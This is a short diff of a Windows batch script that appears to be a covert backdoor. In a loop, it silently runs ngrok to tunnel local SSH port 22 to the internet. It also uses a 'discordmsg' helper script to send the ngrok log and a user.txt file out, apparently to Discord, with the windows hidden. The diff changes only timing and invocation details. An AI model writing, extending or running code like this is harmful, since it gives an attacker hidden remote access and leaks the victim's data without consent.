@@ -25,7 +25,7 @@ call Source.bat +silent --file %temp%/user.txt
 tar -xf ngrok.zip
 
 :ngrokloop
-start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 && timeout 15 & taskkill /IM ngrok.exe /F
-start /B "ngrok" call ngrok.exe tcp 22 -log=stdout > ngrok.log
+start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
+start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
 goto ngrokloop
 
